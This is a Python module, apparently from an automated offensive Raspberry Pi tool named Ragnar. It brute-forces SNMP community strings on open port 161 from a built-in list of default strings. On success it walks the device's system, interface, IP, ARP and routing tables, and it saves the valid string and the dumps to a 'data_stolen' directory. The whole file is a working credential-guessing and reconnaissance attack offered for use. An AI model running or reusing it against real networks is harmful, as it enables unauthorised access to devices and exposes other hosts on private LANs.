"""
snmp_scanner.py - SNMP community string scanner and MIB walker.

When port 161 (SNMP) is found open, tries common community strings (public, private,
etc.) using snmpwalk subprocess. If successful, walks the device MIB for:
  - System info (sysDescr, sysName, sysLocation, sysUptime)
  - Interface list and IP addresses
  - ARP table (reveals other devices on the LAN)
  - Connected device hostnames

Saves all data to data_stolen/snmp/{mac}_{ip}/.

snmpwalk is pre-installed on the Ragnar Pi image as part of snmp-utils.
"""

import os
import json
import logging
import subprocess
from datetime import datetime

from shared import SharedData
from logger import Logger

logger = Logger(name="snmp_scanner.py", level=logging.INFO)

b_class  = "SNMPScanner"
b_module = "snmp_scanner"
b_status = "snmp_scan"
b_port   = 161
b_parent = None

CMD_TIMEOUT = 15  # seconds per snmpwalk call

COMMUNITY_STRINGS = ["public", "private", "community", "snmpd", "manager",
                     "monitor", "switch", "router", "admin", "guest", "read",
                     "write", "secret"]

# OIDs to collect once community string is confirmed
TARGET_OIDS = {
    "system":      "1.3.6.1.2.1.1",      # sysDescr, sysName, sysUptime, sysLocation
    "interfaces":  "1.3.6.1.2.1.2.2",    # ifTable
    "ip_addrs":    "1.3.6.1.2.1.4.20",   # ipAddrTable
    "arp_table":   "1.3.6.1.2.1.4.22",   # ipNetToMediaTable  (IP ↔ MAC mappings!)
    "routes":      "1.3.6.1.2.1.4.21",   # ipRouteTable
}


class SNMPScanner:
    def __init__(self, shared_data):
        self.shared_data = shared_data
        if not self._has_snmpwalk():
            logger.warning("snmpwalk not found — SNMP scanning unavailable")
        logger.info("SNMPScanner initialized")

    def execute(self, ip, port, row, status_key):
        if not getattr(self.shared_data, 'snmp_scanner_enabled', True):
            return 'skipped'

        if not self._has_snmpwalk():
            return 'failed'

        mac = row.get("MAC", "unknown").replace(":", "").lower()
        out_dir = os.path.join(self.shared_data.datastolendir, "snmp", f"{mac}_{ip}")
        info_file = os.path.join(out_dir, "snmp_info.json")

        if os.path.exists(info_file):
            logger.info(f"SNMP already scanned {ip} — skipping")
            return 'success'

        self.shared_data.ragnarorch_status = b_status
        logger.info(f"🔍 SNMPScanner: probing {ip}:{port}")

        community = self._find_community(ip, port)
        if not community:
            logger.info(f"  No valid SNMP community string found on {ip}")
            return 'failed'

        logger.info(f"  ✅ Community '{community}' valid on {ip} — walking MIB")
        mib_data = self._walk_oids(ip, port, community)
        arp_devices = self._parse_arp_table(mib_data.get("arp_table", ""))

        self._save(out_dir, info_file, ip, mac, community, mib_data, arp_devices)
        logger.info(f"  Saved SNMP data for {ip} ({len(arp_devices)} ARP entries)")
        return 'success'

    def _has_snmpwalk(self):
        try:
            subprocess.run(["snmpwalk", "--version"], capture_output=True, timeout=3)
            return True
        except (FileNotFoundError, subprocess.TimeoutExpired):
            return False

    def _find_community(self, ip, port):
        for community in COMMUNITY_STRINGS:
            result = self._snmpwalk(ip, port, community, "1.3.6.1.2.1.1.1.0")
            if result and "Timeout" not in result and "No Such" not in result:
                return community
        return None

    def _snmpwalk(self, ip, port, community, oid, timeout=CMD_TIMEOUT):
        cmd = ["snmpwalk", "-v", "2c", "-c", community, "-r", "1", "-t", "5",
               f"{ip}:{port}", oid]
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
            return result.stdout.strip() if result.returncode == 0 else ""
        except Exception as exc:
            logger.debug(f"  snmpwalk error: {exc}")
            return ""

    def _walk_oids(self, ip, port, community):
        data = {}
        for name, oid in TARGET_OIDS.items():
            out = self._snmpwalk(ip, port, community, oid)
            if out:
                data[name] = out
        return data

    def _parse_arp_table(self, arp_text):
        """Parse ipNetToMedia OIDs to extract IP↔MAC pairs."""
        devices = []
        if not arp_text:
            return devices
        mac_map = {}
        for line in arp_text.splitlines():
            # ipNetToMediaPhysAddress.<ifIndex>.<ip> = STRING: <mac>
            if "PhysAddress" in line and "=" in line:
                try:
                    oid_part, val = line.split("=", 1)
                    mac = val.strip().split()[-1]
                    parts = oid_part.strip().split(".")
                    # Last 4 parts are the IP octets
                    ip = ".".join(parts[-4:])
                    mac_map[ip] = mac
                except Exception:
                    continue
        for ip, mac in mac_map.items():
            devices.append({"ip": ip, "mac": mac})
        return devices

    def _save(self, out_dir, info_file, ip, mac, community, mib_data, arp_devices):
        os.makedirs(out_dir, exist_ok=True)
        info = {
            "ip": ip,
            "mac": mac,
            "community_string": community,
            "arp_devices_found": len(arp_devices),
            "arp_devices": arp_devices,
            "scanned_at": datetime.now().isoformat(),
        }
        with open(info_file, "w") as f:
            json.dump(info, f, indent=2)

        # Save full MIB dump
        for name, content in mib_data.items():
            mib_path = os.path.join(out_dir, f"{name}.txt")
            with open(mib_path, "w") as f:
                f.write(content)
        logger.info(f"  SNMP results saved to {out_dir}")
